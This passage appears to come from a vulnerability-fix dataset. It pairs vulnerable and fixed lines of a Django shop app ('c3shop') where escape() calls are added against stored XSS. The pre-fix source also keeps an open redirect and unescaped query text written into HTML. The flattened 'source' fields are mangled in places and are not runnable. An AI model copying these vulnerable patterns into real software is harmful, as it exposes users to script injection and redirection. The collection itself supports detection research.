                            "diff": "\n             rights = int(request.POST[\"rights\"])\n             if not check_password_conformity(pw1, pw2):\n                 recreate_form('password mismatch')\n-            auth_user: User = User.objects.create_user(username=username, email=mail, password=pw1)\n+            auth_user: User = User.objects.create_user(username=escape(username), email=escape(mail), password=pw1)\n             auth_user.save()\n             user: Profile = Profile()\n             user.rights = rights\n             user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n-            user.displayName = displayname\n+            user.displayName = escape(displayname)\n             user.authuser = auth_user\n             user.dect = dect\n-            user.notes = notes\n+            user.notes = escape(notes)\n             user.active = True\n             user.save()\n             pass",
                            "add": 3,
                            "remove": 3,
                            "filename": "/c3shop/frontpage/management/edit_user.py",
                            "badparts": [
                                "            auth_user: User = User.objects.create_user(username=username, email=mail, password=pw1)",
                                "            user.displayName = displayname",
                                "            user.notes = notes"
                            ],
                            "goodparts": [
                                "            auth_user: User = User.objects.create_user(username=escape(username), email=escape(mail), password=pw1)",
                                "            user.displayName = escape(displayname)",
                                "            user.notes = escape(notes)"
                            ]
                        }
                    ],
                    "source": "\nfrom django.http import HttpRequest, HttpResponseForbidden, HttpResponseBadRequest from django.shortcuts import redirect from django.contrib.auth.models import User from. import page_skeleton, magic from.form import Form, TextField, PlainText, TextArea, SubmitButton, NumberField, PasswordField, CheckBox, CheckEnum from..models import Profile, Media from..uitools.dataforge import get_csrf_form_element from.magic import get_current_user import logging def render_edit_page(http_request: HttpRequest, action_url: str): user_id=None profile: Profile=None if http_request.GET.get(\"user_id\"): user_id=int(http_request.GET[\"user_id\"]) if user_id is not None: profile=Profile.objects.get(pk=user_id) f=Form() f.action_url=action_url if profile: f.add_content(PlainText('<h3>Edit user \"' +profile.authuser.username +'\"</h3>')) f.add_content(PlainText('<a href=\"/admin/media/select?action_url=/admin/actions/change-user-avatar' '&payload=' +str(user_id) +'\"><img class=\"button-img\" alt=\"Change avatar\" ' 'src=\"/staticfiles/frontpage/change-avatar.png\"/></a><br />')) else: f.add_content(PlainText('<h3>Add new user</h3>')) if not profile: f.add_content(PlainText(\"username(can't be edited later on): \")) f.add_content(TextField(name='username')) if http_request.GET.get('fault') and profile: f.add_content(PlainText(\"Unable to edit user due to: \" +str(http_request.GET['fault']))) elif http_request.GET.get('fault'): f.add_content(PlainText(\"Unable to add user due to: \" +str(http_request.GET['fault']))) current_user: Profile=get_current_user(http_request) if current_user.rights > 3: if not profile: f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=CheckEnum.CHECKED)) else: m: CheckEnum=CheckEnum.CHECKED if not profile.active: m=CheckEnum.NOT_CHECKED f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=m)) if profile: f.add_content(PlainText(\"Email address: \")) f.add_content(TextField(name='email', button_text=str(profile.authuser.email))) f.add_content(PlainText(\"Display name: \")) f.add_content(TextField(name='display_name', button_text=profile.displayName)) f.add_content(PlainText('DECT: ')) f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0)) f.add_content(PlainText('Number of allowed reservations: ')) f.add_content(NumberField(name='allowed_reservations', button_text=str(profile.number_of_allowed_reservations), minimum=0)) f.add_content(PlainText(\"Rights: \")) f.add_content(NumberField(name=\"rights\", button_text=str(profile.rights), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', text=str(profile.notes))) else: f.add_content(PlainText(\"Email address: \")) f.add_content(TextField(name='email')) f.add_content(PlainText(\"Display name: \")) f.add_content(TextField(name='display_name')) f.add_content(PlainText('DECT: ')) f.add_content(NumberField(name='dect', minimum=0)) f.add_content(PlainText('Number of allowed reservations: ')) f.add_content(NumberField(name='allowed_reservations', button_text=str(1), minimum=0)) f.add_content(PlainText(\"Rights: \")) f.add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen\")) if profile: f.add_content(PlainText('<br /><br />Change password(leave blank in order to not change it):')) else: f.add_content(PlainText('<br />Choose a password: ')) f.add_content(PasswordField(name='password', required=False)) f.add_content(PlainText('Confirm your password: ')) f.add_content(PasswordField(name='confirm_password', required=False)) f.add_content(PlainText(get_csrf_form_element(http_request))) f.add_content(SubmitButton()) a='<div class=\"w3-row w3-padding-64 w3-twothird w3-container admin-popup\">' a +=f.render_html(http_request) a +=\"</div>\" return a def check_password_conformity(pw1: str, pw2: str): if not(pw1==pw2): return False if len(pw1) < 6: return False if pw1.isupper(): return False if pw1.islower(): return False return True def recreate_form(reason: str): return redirect('/admin/users/edit?fault=' +str(reason)) def action_save_user(request: HttpRequest, default_forward_url: str=\"/admin/users\"): \"\"\" This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse :param request: the HttpRequest :param default_forward_url: The URL to forward to if nothing was specified :return: The crafted HttpResponse \"\"\" forward_url=default_forward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if not request.user.is_authenticated: return HttpResponseForbidden() profile=Profile.objects.get(authuser=request.user) if profile.rights < 2: return HttpResponseForbidden() try: if request.GET.get(\"user_id\"): pid=int(request.GET[\"user_id\"]) displayname=str(request.POST[\"display_name\"]) dect=int(request.POST[\"dect\"]) notes=str(request.POST[\"notes\"]) pw1=str(request.POST[\"password\"]) pw2=str(request.POST[\"confirm_password\"]) mail=str(request.POST[\"email\"]) rights=int(request.POST[\"rights\"]) user: Profile=Profile.objects.get(pk=pid) user.displayName=displayname user.dect=dect user.notes=notes user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) if request.POST.get(\"active\"): user.active=magic.parse_bool(request.POST[\"active\"]) au: User=user.authuser if check_password_conformity(pw1, pw2): logging.log(logging.INFO, \"Set password for user: \" +user.displayName) au.set_password(pw1) else: logging.log(logging.INFO, \"Failed to set password for: \" +user.displayName) au.email=mail au.save() user.save() else: username=str(request.POST[\"username\"]) displayname=str(request.POST[\"display_name\"]) dect=int(request.POST[\"dect\"]) notes=str(request.POST[\"notes\"]) pw1=str(request.POST[\"password\"]) pw2=str(request.POST[\"confirm_password\"]) mail=str(request.POST[\"email\"]) rights=int(request.POST[\"rights\"]) if not check_password_conformity(pw1, pw2): recreate_form('password mismatch') auth_user: User=User.objects.create_user(username=username, email=mail, password=pw1) auth_user.save() user: Profile=Profile() user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) user.displayName=displayname user.authuser=auth_user user.dect=dect user.notes=notes user.active=True user.save() pass pass except Exception as e: return HttpResponseBadRequest(str(e)) return redirect(forward_url) ",
                    "sourceWithComments": "from django.http import HttpRequest, HttpResponseForbidden, HttpResponseBadRequest\nfrom django.shortcuts import redirect\nfrom django.contrib.auth.models import User\nfrom . import page_skeleton, magic\nfrom .form import Form, TextField, PlainText, TextArea, SubmitButton, NumberField, PasswordField, CheckBox, CheckEnum\nfrom ..models import Profile, Media\nfrom ..uitools.dataforge import get_csrf_form_element\nfrom .magic import get_current_user\nimport logging\n\n\ndef render_edit_page(http_request: HttpRequest, action_url: str):\n\n    user_id = None\n    profile: Profile = None\n    if http_request.GET.get(\"user_id\"):\n        user_id = int(http_request.GET[\"user_id\"])\n    if user_id is not None:\n        profile = Profile.objects.get(pk=user_id)\n    f = Form()\n    f.action_url = action_url\n    if profile:\n        f.add_content(PlainText('<h3>Edit user \"' + profile.authuser.username + '\"</h3>'))\n        f.add_content(PlainText('<a href=\"/admin/media/select?action_url=/admin/actions/change-user-avatar'\n                                '&payload=' + str(user_id) + '\"><img class=\"button-img\" alt=\"Change avatar\" '\n                                'src=\"/staticfiles/frontpage/change-avatar.png\"/></a><br />'))\n    else:\n        f.add_content(PlainText('<h3>Add new user</h3>'))\n    if not profile:\n        f.add_content(PlainText(\"username (can't be edited later on): \"))\n        f.add_content(TextField(name='username'))\n    if http_request.GET.get('fault') and profile:\n        f.add_content(PlainText(\"Unable to edit user due to: \" + str(http_request.GET['fault'])))\n    elif http_request.GET.get('fault'):\n        f.add_content(PlainText(\"Unable to add user due to: \" + str(http_request.GET['fault'])))\n    current_user: Profile = get_current_user(http_request)\n    if current_user.rights > 3:\n        if not profile:\n            f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=CheckEnum.CHECKED))\n        else:\n            m: CheckEnum = CheckEnum.CHECKED\n            if not profile.active:\n                m = CheckEnum.NOT_CHECKED\n            f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=m))\n    if profile:\n        f.add_content(PlainText(\"Email address: \"))\n        f.add_content(TextField(name='email', button_text=str(profile.authuser.email)))\n        f.add_content(PlainText(\"Display name: \"))\n        f.add_content(TextField(name='display_name', button_text=profile.displayName))\n        f.add_content(PlainText('DECT: '))\n        f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0))\n        f.add_content(PlainText('Number of allowed reservations: '))\n        f.add_content(NumberField(name='allowed_reservations', button_text=str(profile.number_of_allowed_reservations), minimum=0))\n        f.add_content(PlainText(\"Rights: \"))\n        f.add_content(NumberField(name=\"rights\", button_text=str(profile.rights), minimum=0, maximum=4))\n        f.add_content(PlainText('Notes:<br/>'))\n        f.add_content(TextArea(name='notes', text=str(profile.notes)))\n    else:\n        f.add_content(PlainText(\"Email address: \"))\n        f.add_content(TextField(name='email'))\n        f.add_content(PlainText(\"Display name: \"))\n        f.add_content(TextField(name='display_name'))\n        f.add_content(PlainText('DECT: '))\n        f.add_content(NumberField(name='dect', minimum=0))\n        f.add_content(PlainText('Number of allowed reservations: '))\n        f.add_content(NumberField(name='allowed_reservations', button_text=str(1), minimum=0))\n        f.add_content(PlainText(\"Rights: \"))\n        f.add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4))\n        f.add_content(PlainText('Notes:<br/>'))\n        f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen\"))\n    if profile:\n        f.add_content(PlainText('<br /><br />Change password (leave blank in order to not change it):'))\n    else:\n        f.add_content(PlainText('<br />Choose a password: '))\n    f.add_content(PasswordField(name='password', required=False))\n    f.add_content(PlainText('Confirm your password: '))\n    f.add_content(PasswordField(name='confirm_password', required=False))\n    f.add_content(PlainText(get_csrf_form_element(http_request)))\n    f.add_content(SubmitButton())\n    # a = page_skeleton.render_headbar(http_request, \"Edit User\")\n    a = '<div class=\"w3-row w3-padding-64 w3-twothird w3-container admin-popup\">'\n    a += f.render_html(http_request)\n    # a += page_skeleton.render_footer(http_request)\n    a += \"</div>\"\n    return a\n\n\ndef check_password_conformity(pw1: str, pw2: str):\n    if not (pw1 == pw2):\n        return False\n    if len(pw1) < 6:\n        return False\n    if pw1.isupper():\n        return False\n    if pw1.islower():\n        return False\n    return True\n\n\ndef recreate_form(reason: str):\n    return redirect('/admin/users/edit?fault=' + str(reason))\n\n\ndef action_save_user(request: HttpRequest, default_forward_url: str = \"/admin/users\"):\n    \"\"\"\n    This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse\n    :param request: the HttpRequest\n    :param default_forward_url: The URL to forward to if nothing was specified\n    :return: The crafted HttpResponse\n    \"\"\"\n    forward_url = default_forward_url\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    if not request.user.is_authenticated:\n        return HttpResponseForbidden()\n    profile = Profile.objects.get(authuser=request.user)\n    if profile.rights < 2:\n        return HttpResponseForbidden()\n    try:\n        if request.GET.get(\"user_id\"):\n            pid = int(request.GET[\"user_id\"])\n            displayname = str(request.POST[\"display_name\"])\n            dect = int(request.POST[\"dect\"])\n            notes = str(request.POST[\"notes\"])\n            pw1 = str(request.POST[\"password\"])\n            pw2 = str(request.POST[\"confirm_password\"])\n            mail = str(request.POST[\"email\"])\n            rights = int(request.POST[\"rights\"])\n            user: Profile = Profile.objects.get(pk=pid)\n            user.displayName = displayname\n            user.dect = dect\n            user.notes = notes\n            user.rights = rights\n            user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n            if request.POST.get(\"active\"):\n                user.active = magic.parse_bool(request.POST[\"active\"])\n            au: User = user.authuser\n            if check_password_conformity(pw1, pw2):\n                logging.log(logging.INFO, \"Set password for user: \" + user.displayName)\n                au.set_password(pw1)\n            else:\n                logging.log(logging.INFO, \"Failed to set password for: \" + user.displayName)\n            au.email = mail\n            au.save()\n            user.save()\n        else:\n            # assume new user\n            username = str(request.POST[\"username\"])\n            displayname = str(request.POST[\"display_name\"])\n            dect = int(request.POST[\"dect\"])\n            notes = str(request.POST[\"notes\"])\n            pw1 = str(request.POST[\"password\"])\n            pw2 = str(request.POST[\"confirm_password\"])\n            mail = str(request.POST[\"email\"])\n            rights = int(request.POST[\"rights\"])\n            if not check_password_conformity(pw1, pw2):\n                recreate_form('password mismatch')\n            auth_user: User = User.objects.create_user(username=username, email=mail, password=pw1)\n            auth_user.save()\n            user: Profile = Profile()\n            user.rights = rights\n            user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n            user.displayName = displayname\n            user.authuser = auth_user\n            user.dect = dect\n            user.notes = notes\n            user.active = True\n            user.save()\n            pass\n        pass\n    except Exception as e:\n        return HttpResponseBadRequest(str(e))\n    return redirect(forward_url)\n"
                },
                "/c3shop/frontpage/management/mediatools/media_actions.py": {
                    "changes": [
                        {
                            "diff": "\n     height *= IMAGE_SCALE\n     cropped = original.resize((int(width), int(height)), PIL.Image.LANCZOS)\n     cropped.save(low_res_file_name)\n-    m.text = text\n-    m.cachedText = compile_markdown(text)\n-    m.category = category\n+    m.text = escape(text)\n+    m.cachedText = compile_markdown(escape(text))\n+    m.category = escape(category)\n     m.highResFile = \"/\" + high_res_file_name\n     m.lowResFile = \"/\" + low_res_file_name\n-    m.headline = headline\n+    m.headline = escape(headline)\n     m.save()\n     mu: MediaUpload = MediaUpload()\n     mu.UID = ",
                            "add": 4,
                            "remove": 4,
                            "filename": "/c3shop/frontpage/management/mediatools/media_actions.py",
                            "badparts": [
                                "    m.text = text",
                                "    m.cachedText = compile_markdown(text)",
                                "    m.category = category",
                                "    m.headline = headline"
                            ],
                            "goodparts": [
                                "    m.text = escape(text)",
                                "    m.cachedText = compile_markdown(escape(text))",
                                "    m.category = escape(category)",
                                "    m.headline = escape(headline)"
                            ]
                        }
                    ],
                    "source": "\nfrom datetime import date, time from django.shortcuts import redirect from django.http import HttpRequest, HttpResponseBadRequest from frontpage.models import Profile, Media, MediaUpload from frontpage.management.magic import compile_markdown, get_current_user import logging import ntpath import os import math import PIL from PIL import Image PATH_TO_UPLOAD_FOLDER_ON_DISK: str=\"/usr/local/www/focweb/\" IMAGE_SCALE=64 def action_change_user_avatar(request: HttpRequest): try: user_id=int(request.GET[\"payload\"]) media_id=int(request.GET[\"media_id\"]) user: Profile=Profile.objects.get(pk=int(user_id)) u: Profile=get_current_user(request) if not(u==user) and u.rights < 4: return redirect(\"/admin?error='You're not allowed to edit other users.'\") medium=Media.objects.get(pk=int(media_id)) user.avatarMedia=medium user.save() except Exception as e: return redirect(\"/admin?error=\" +str(e)) return redirect(\"/admin/users\") def handle_file(u: Profile, headline: str, category: str, text: str, file): m: Media=Media() upload_base_path: str='uploads/' +str(date.today().year) high_res_file_name=upload_base_path +'/HIGHRES_' +ntpath.basename(file.name.replace(\" \", \"_\")) low_res_file_name=upload_base_path +'/LOWRES_' +ntpath.basename(file.name.replace(\" \", \"_\")) if not os.path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path): os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path) with open(high_res_file_name, 'wb+') as destination: for chunk in file.chunks(): destination.write(chunk) original=Image.open(high_res_file_name) width, height=original.size diameter=math.sqrt(math.pow(width, 2) +math.pow(height, 2)) width /=diameter height /=diameter width *=IMAGE_SCALE height *=IMAGE_SCALE cropped=original.resize((int(width), int(height)), PIL.Image.LANCZOS) cropped.save(low_res_file_name) m.text=text m.cachedText=compile_markdown(text) m.category=category m.highResFile=\"/\" +high_res_file_name m.lowResFile=\"/\" +low_res_file_name m.headline=headline m.save() mu: MediaUpload=MediaUpload() mu.UID=u mu.MID=m mu.save() logging.info(\"Uploaded file '\" +str(file.name) +\"' and cropped it. The resulting PK is \" +str(m.pk)) def action_add_single_media(request: HttpRequest): try: headline=request.POST[\"headline\"] category=request.POST[\"category\"] text=request.POST[\"text\"] file=request.FILES['file'] user: Profile=get_current_user(request) handle_file(user, headline, category, text, file) except Exception as e: return redirect(\"/admin/media/add?hint=\" +str(e)) return redirect(\"/admin/media/add\") def action_add_multiple_media(request: HttpRequest): try: category: str=request.POST[\"category\"] files=request.FILES.getlist('files') user: Profile=get_current_user(request) for f in files: handle_file(user, str(f.name), category, \" except Exception as e: return redirect(\"/admin/media/add?hint=\" +str(e)) return redirect(\"/admin/media/add\") ",
                    "sourceWithComments": "from datetime import date, time\nfrom django.shortcuts import redirect\nfrom django.http import HttpRequest, HttpResponseBadRequest\nfrom frontpage.models import Profile, Media, MediaUpload\nfrom frontpage.management.magic import compile_markdown, get_current_user\n\nimport logging\nimport ntpath\nimport os\nimport math\nimport PIL\nfrom PIL import Image\n\n\nPATH_TO_UPLOAD_FOLDER_ON_DISK: str = \"/usr/local/www/focweb/\"\nIMAGE_SCALE = 64\n\n\ndef action_change_user_avatar(request: HttpRequest):\n    try:\n        user_id = int(request.GET[\"payload\"])\n        media_id = int(request.GET[\"media_id\"])\n        user: Profile = Profile.objects.get(pk=int(user_id))\n        u: Profile = get_current_user(request)\n        if not (u == user) and u.rights < 4:\n            return redirect(\"/admin?error='You're not allowed to edit other users.'\")\n        medium = Media.objects.get(pk=int(media_id))\n        user.avatarMedia = medium\n        user.save()\n    except Exception as e:\n        return redirect(\"/admin?error=\" + str(e))\n    return redirect(\"/admin/users\")\n\n\ndef handle_file(u: Profile, headline: str, category: str, text: str, file):\n    m: Media = Media()\n    upload_base_path: str = 'uploads/' + str(date.today().year)\n    high_res_file_name = upload_base_path + '/HIGHRES_' + ntpath.basename(file.name.replace(\" \", \"_\"))\n    low_res_file_name = upload_base_path + '/LOWRES_' + ntpath.basename(file.name.replace(\" \", \"_\"))\n    if not os.path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path):\n        os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path)\n    with open(high_res_file_name, 'wb+') as destination:\n        for chunk in file.chunks():\n            destination.write(chunk)\n    # TODO crop image\n    original = Image.open(high_res_file_name)\n    width, height = original.size\n    diameter = math.sqrt(math.pow(width, 2) + math.pow(height, 2))\n    width /= diameter\n    height /= diameter\n    width *= IMAGE_SCALE\n    height *= IMAGE_SCALE\n    cropped = original.resize((int(width), int(height)), PIL.Image.LANCZOS)\n    cropped.save(low_res_file_name)\n    m.text = text\n    m.cachedText = compile_markdown(text)\n    m.category = category\n    m.highResFile = \"/\" + high_res_file_name\n    m.lowResFile = \"/\" + low_res_file_name\n    m.headline = headline\n    m.save()\n    mu: MediaUpload = MediaUpload()\n    mu.UID = u\n    mu.MID = m\n    mu.save()\n    logging.info(\"Uploaded file '\" + str(file.name) + \"' and cropped it. The resulting PK is \" + str(m.pk))\n\n\ndef action_add_single_media(request: HttpRequest):\n    try:\n        headline = request.POST[\"headline\"]\n        category = request.POST[\"category\"]\n        text = request.POST[\"text\"]\n        file = request.FILES['file']\n        user: Profile = get_current_user(request)\n        handle_file(user, headline, category, text, file)\n    except Exception as e:\n        return redirect(\"/admin/media/add?hint=\" + str(e))\n    return redirect(\"/admin/media/add\")\n\n\ndef action_add_multiple_media(request: HttpRequest):\n    try:\n        category: str = request.POST[\"category\"]\n        files = request.FILES.getlist('files')\n        user: Profile = get_current_user(request)\n        for f in files:\n            handle_file(user, str(f.name), category, \"### There is no media description\", f)\n    except Exception as e:\n        return redirect(\"/admin/media/add?hint=\" + str(e))\n    return redirect(\"/admin/media/add\")\n"
                },
                "/c3shop/frontpage/management/reservation_actions.py": {
                    "changes": [
                        {
                            "diff": "\n         # Actual adding of article\n         aid: int = int(request.GET.get(\"article_id\"))\n         quantity: int = int(request.POST[\"quantity\"])\n-        notes: str = request.POST[\"notes\"]\n+        notes: str = escape(request.POST[\"notes\"])\n         ar = ArticleRequested()\n         ar.AID = Article.objects.get(id=aid)\n         ar.RID = current_reservation\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/c3shop/frontpage/management/reservation_actions.py",
                            "badparts": [
                                "        notes: str = request.POST[\"notes\"]"
                            ],
                            "goodparts": [
                                "        notes: str = escape(request.POST[\"notes\"])"
                            ]
                        },
                        {
                            "diff": "\n                 ar.amount = amount\n                 if \"srid\" in request.GET:\n                     ar.SRID = SubReservation.objects.get(id=int(request.GET[\"srid\"]))\n-                ar.notes = str(request.POST[str(\"notes_\" + str(art.id))])\n+                ar.notes = escape(str(request.POST[str(\"notes_\" + str(art.id))]))\n                 ar.save()\n     if \"srid\" in request.GET:\n         response = HttpResponseRedirect(forward_url + \"?rid=\" + str(current_reservation.id) + \"&srid=\" + request.GET[\"srid\"])\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/c3shop/frontpage/management/reservation_actions.py",
                            "badparts": [
                                "                ar.notes = str(request.POST[str(\"notes_\" + str(art.id))])"
                            ],
                            "goodparts": [
                                "                ar.notes = escape(str(request.POST[str(\"notes_\" + str(art.id))]))"
                            ]
                        },
                        {
                            "diff": "\n         else:\n             sr = SubReservation.objects.get(id=srid)\n         if request.POST.get(\"notes\"):\n-            sr.notes = request.POST[\"notes\"]\n+            sr.notes = escape(request.POST[\"notes\"])\n         else:\n             sr.notes = \" \"\n         sr.primary_reservation = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/c3shop/frontpage/management/reservation_actions.py",
                            "badparts": [
                                "            sr.notes = request.POST[\"notes\"]"
                            ],
                            "goodparts": [
                                "            sr.notes = escape(request.POST[\"notes\"])"
                            ]
                        },
                        {
                            "diff": "\n     else:\n         return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\")\n     if request.POST.get(\"notes\"):\n-        r.notes = request.POST[\"notes\"]\n+        r.notes = escape(request.POST[\"notes\"])\n     if request.POST.get(\"contact\"):\n-        r.responsiblePerson = str(request.POST[\"contact\"])\n+        r.responsiblePerson = escape(str(request.POST[\"contact\"]))\n     if (r.createdByUser == u or o.rights > 1) and not r.submitted:\n         r.save()\n     else:\n",
                            "add": 2,
                            "remove": 2,
                            "filename": "/c3shop/frontpage/management/reservation_actions.py",
                            "badparts": [
                                "        r.notes = request.POST[\"notes\"]",
                                "        r.responsiblePerson = str(request.POST[\"contact\"])"
                            ],
                            "goodparts": [
                                "        r.notes = escape(request.POST[\"notes\"])",
                                "        r.responsiblePerson = escape(str(request.POST[\"contact\"]))"
                            ]
                        }
                    ],
                    "source": "\nfrom django.http import HttpRequest, HttpResponseRedirect from..models import GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation from.magic import get_current_user import json import datetime RESERVATION_CONSTRUCTION_COOKIE_KEY: str=\"org.technikradio.c3shop.frontpage\" +\\ \".reservation.cookiekey\" EMPTY_COOKY_VALUE: str=''' { \"notes\": \"\", \"articles\":[], \"pickup_date\": \"\" } ''' def update_reservation_articles(postdict, rid): res: GroupReservation=GroupReservation.objects.get(id=rid) def add_article_action(request: HttpRequest, default_foreward_url: str): forward_url: str=default_foreward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] else: forward_url=\"/admin\" if \"rid\" not in request.GET: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") u: Profile=get_current_user(request) current_reservation=GroupReservation.objects.get(id=str(request.GET[\"rid\"])) if current_reservation.createdByUser !=u and u.rights < 2: return HttpResponseRedirect(\"/admin?error=noyb\") if current_reservation.submitted==True: return HttpResponseRedirect(\"/admin?error=Already%20submitted\") if \"article_id\" in request.POST: aid: int=int(request.GET.get(\"article_id\")) quantity: int=int(request.POST[\"quantity\"]) notes: str=request.POST[\"notes\"] ar=ArticleRequested() ar.AID=Article.objects.get(id=aid) ar.RID=current_reservation if \"srid\" in request.GET: ar.SRID=SubReservation.objects.get(id=int(request.GET[\"srid\"])) ar.amount=quantity ar.notes=notes ar.save() else: if \"group_id\" not in request.GET: return HttpResponseRedirect(\"/admin?error=missing%20group%20id\") g: ArticleGroup=ArticleGroup.objects.get(id=int(request.GET[\"group_id\"])) for art in Article.objects.all().filter(group=g): if str(\"quantity_\" +str(art.id)) not in request.POST or str(\"notes_\" +str(art.id)) not in request.POST: return HttpResponseRedirect(\"/admin?error=Missing%20article%20data%20in%20request\") amount=int(request.POST[\"quantity_\" +str(art.id)]) if amount > 0: ar=ArticleRequested() ar.AID=art ar.RID=current_reservation ar.amount=amount if \"srid\" in request.GET: ar.SRID=SubReservation.objects.get(id=int(request.GET[\"srid\"])) ar.notes=str(request.POST[str(\"notes_\" +str(art.id))]) ar.save() if \"srid\" in request.GET: response=HttpResponseRedirect(forward_url +\"?rid=\" +str(current_reservation.id) +\"&srid=\" +request.GET[\"srid\"]) else: response=HttpResponseRedirect(forward_url +\"?rid=\" +str(current_reservation.id)) return response def write_db_reservation_action(request: HttpRequest): \"\"\" This function is used to submit the reservation \"\"\" u: Profile=get_current_user(request) forward_url=\"/admin?success\" if u.rights > 0: forward_url=\"/admin/reservations\" if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if \"payload\" not in request.GET: return HttpResponseRedirect(\"/admin?error=No%20id%20provided\") current_reservation=GroupReservation.objects.get(id=int(request.GET[\"payload\"])) if current_reservation.createdByUser !=u and u. rights < 2: return HttpResponseRedirect(\"/admin?error=noyb\") current_reservation.submitted=True current_reservation.save() res: HttpResponseRedirect=HttpResponseRedirect(forward_url) return res def manipulate_reservation_action(request: HttpRequest, default_foreward_url: str): \"\"\" This function is used to alter the reservation beeing build inside a cookie. This function automatically crafts the required response. \"\"\" js_string: str=\"\" r: GroupReservation=None u: Profile=get_current_user(request) forward_url: str=default_foreward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if \"srid\" in request.GET: if not request.GET.get(\"rid\"): return HttpResponseRedirect(\"/admin?error=missing%20primary%20reservation%20id\") srid: int=int(request.GET[\"srid\"]) sr: SubReservation=None if srid==0: sr=SubReservation() else: sr=SubReservation.objects.get(id=srid) if request.POST.get(\"notes\"): sr.notes=request.POST[\"notes\"] else: sr.notes=\" \" sr.primary_reservation=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) sr.save() print(request.POST) print(sr.notes) return HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"])) +\"&srid=\" +str(sr.id)) if \"rid\" in request.GET: r=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u).count(): r=GroupReservation() r.createdByUser=u r.ready=False r.open=True r.pickupDate=datetime.datetime.now() else: return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\") if request.POST.get(\"notes\"): r.notes=request.POST[\"notes\"] if request.POST.get(\"contact\"): r.responsiblePerson=str(request.POST[\"contact\"]) if(r.createdByUser==u or o.rights > 1) and not r.submitted: r.save() else: return HttpResponseRedirect(\"/admin?error=noyb\") response: HttpResponseRedirect=HttpResponseRedirect(forward_url +\"?rid=\" +str(r.id)) return response def action_delete_article(request: HttpRequest): \"\"\" This function removes an article from the reservation and returnes the required resonse. \"\"\" u: Profile=get_current_user(request) if \"rid\" in request.GET: if \"srid\" in request.GET: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"])) +\\ '&srid=' +str(int(request.GET['srid']))) else: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"]))) else: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") if request.GET.get(\"id\"): aid: ArticleRequested=ArticleRequested.objects.get(id=int(request.GET[\"id\"])) r: GroupReservation=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) if(aid.RID.createdByUser==u or u.rights > 1) and aid.RID==r and not r.submitted: aid.delete() else: return HttpResponseRedirect(\"/admin?error=You're%20not%20allowed%20to%20do%20this\") return response ",
                    "sourceWithComments": "from django.http import HttpRequest, HttpResponseRedirect\n# from django.shortcuts import redirect\nfrom ..models import GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation\nfrom .magic import get_current_user\nimport json\nimport datetime\n\nRESERVATION_CONSTRUCTION_COOKIE_KEY: str = \"org.technikradio.c3shop.frontpage\" + \\\n        \".reservation.cookiekey\"\nEMPTY_COOKY_VALUE: str = '''\n{\n\"notes\": \"\",\n\"articles\": [],\n\"pickup_date\": \"\"\n}\n'''\n\n\ndef update_reservation_articles(postdict, rid):\n    res: GroupReservation = GroupReservation.objects.get(id=rid)\n\n\n\ndef add_article_action(request: HttpRequest, default_foreward_url: str):\n    forward_url: str = default_foreward_url\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    else:\n        forward_url = \"/admin\"\n    if \"rid\" not in request.GET:\n        return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\")\n    u: Profile = get_current_user(request)\n    current_reservation = GroupReservation.objects.get(id=str(request.GET[\"rid\"]))\n    if current_reservation.createdByUser != u and u.rights < 2:\n        return HttpResponseRedirect(\"/admin?error=noyb\")\n    if current_reservation.submitted == True:\n        return HttpResponseRedirect(\"/admin?error=Already%20submitted\")\n    # Test for multiple or single article\n    if \"article_id\" in request.POST:\n        # Actual adding of article\n        aid: int = int(request.GET.get(\"article_id\"))\n        quantity: int = int(request.POST[\"quantity\"])\n        notes: str = request.POST[\"notes\"]\n        ar = ArticleRequested()\n        ar.AID = 